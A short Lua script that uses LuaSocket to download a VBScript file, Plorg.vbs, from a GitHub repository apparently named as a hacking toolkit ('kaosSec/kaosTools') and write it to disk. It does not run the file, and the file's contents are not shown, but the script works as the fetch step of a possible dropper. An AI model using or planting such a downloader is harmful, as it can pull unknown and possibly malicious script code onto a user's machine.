local http = require("socket.http")
local ltn12 = require("ltn12")

-- URL of the file to download
local url = "https://github.com/kaosSec/kaosTools/raw/main/luvzmiscvbs/Plorg.vbs"

-- Destination file path
local file = io.open("Plorg.vbs", "w")

-- Send a GET request to the server
http.request{
    url = url,
    sink = ltn12.sink.file(file),
}

-- Close the destination file
file:close()
